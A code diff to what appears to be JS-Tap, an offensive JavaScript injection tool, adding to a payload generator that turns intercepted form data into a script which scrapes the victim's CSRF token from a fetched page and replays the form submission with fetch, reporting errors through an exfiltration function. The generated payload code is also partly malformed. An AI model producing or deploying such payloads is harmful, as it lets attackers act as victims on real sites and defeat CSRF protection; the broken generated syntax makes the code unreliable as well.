@@ -1100,6 +1100,7 @@ async function searchToken(eventKey, tokenName, tokenValue)
 
 
 
+
 async function showMimicFormModal(eventKey, formDataString)
 {
 
@@ -1183,6 +1184,20 @@ async function showMimicFormModal(eventKey, formDataString)
     	searchButton.blur();
     }
 
+    // Prep our form parameters/values
+    var lines      = formContent.trim().split('\n');
+ 
+    var parsedForm = lines.map(line => {
+    	var parts      = line.trim().split(':');
+    	return {
+    		key: parts[0].trim(),
+    		value: parts[1].trim()
+    	};
+    });
+
+    console.log("--Parsed form: ");
+    console.log(parsedForm);
+
 
     // Generate a mimic payload
     nextButton.onclick = function(event)
@@ -1191,6 +1206,46 @@ async function showMimicFormModal(eventKey, formDataString)
     	var payload = "";
 
     	payload += "// JS-Tap mimic generated payload\n";
+    	payload += "// Payload variables below with intercepted values. Modify as you see fit.\n";
+    	payload += "// ----------------------------------------------------------------------.\n";
+
+    	parsedForm.forEach(item => {
+    		// Skip the CSRF variable, we'll handle that later automatically
+    		if (item.key.trim() === csrfName.value.trim())
+    		{
+    			return;
+    		}
+
+    		payload += `var ${item.key}_var = '${item.value}';\n`;
+    	});
+    	payload += "// ----------------------------------------------------------------------.\n";
+
+	    // Default type on null
+		if (formEncType === null || formAction === undefined || formAction === '' || formAction === 'null')
+		{
+			formEncType = "'application/x-www-form-urlencoded'";
+		}
+
+		// Defaults to current page if null, so the page with the CSRF token
+		if (formAction === null || formAction === undefined || formAction === '' || formAction === 'null')
+		{
+			formAction = tokenUrl;
+		}
+
+    	payload += "\n\n";
+		payload += "var bodyData = {\n";
+		parsedForm.forEach((item, index, array) => {
+			var variableName = item.key.replace(/-/g, '_');
+
+		    payload += `	${item.key}: ${variableName}_var`;
+		    if (index < array.length - 1) {
+		        payload += ',';
+		    }
+		    payload += '\n';
+		});
+		payload += "};\n";
+
+    	payload += "\n\n";
 
     	// Check if we have a CSRF token to deal with
     	if (searchDataDiv.innerHTML != "")
@@ -1210,8 +1265,38 @@ async function showMimicFormModal(eventKey, formDataString)
     		payload += "		var parser     = new DOMParser();\n";
     		payload += "		var parsedDoc  = parser.parseFromString(fetchedContent, 'text/html');\n";
     		payload += `		var tokenInput = parsedDoc.querySelector('input[name="` + csrfName.value + `"]');\n`;
-    		payload += "		var csrfToken  = tokenInput.value;\n";
+    		payload += "		return tokenInput ? tokenInput.value : null;\n";
     		payload += "	})\n";
+    		payload += "	.then(csrfToken => {\n";
+    		payload += "		if (!csrfToken) {\n";
+    		payload += "			customExfil('Error', 'Error using CSRF Token in mimic payload');\n";
+    		payload += "		}\n\n";
+    		payload += "		// Actual request is below:\n";
+    		payload += "		fetch('" + formAction + "') {\n;"
+    		payload += `			method: '${formMethod}',\n`;
+    		payload += "			headers: {\n";
+    		payload += `				'Content-Type': '${formEncType}',\n`;
+    		payload += "			},\n";
+
+
+    		console.log("$$$$$ encType: " + formEncType);
+    		if (formEncType == "'application/x-www-form-urlencoded'")
+    		{
+
+    			payload += "			body: Object.keys(bodyData).map(key => encodeURIComponent(key) + '=' + encodeURIComponent(bodyData[key])).join('&');\n";
+    		}
+    		else if (formEncType == "'application/json'")
+    		{
+    			payload += "			body: JSON.stringify(bodyData)\n";
+    		}
+    		else
+    		{
+    			console.log("*** Error, this encoding type not handled yet");
+    		}
+
+    		payload += "	})\n";
+
+
 
     		console.log("Generated payload:");
     		console.log(payload);
@@ -1222,6 +1307,7 @@ async function showMimicFormModal(eventKey, formDataString)
     		console.log("-- Generating payload withough a CSRF token...");
     	}
 
+    	nextButton.blur();
     }
 
 
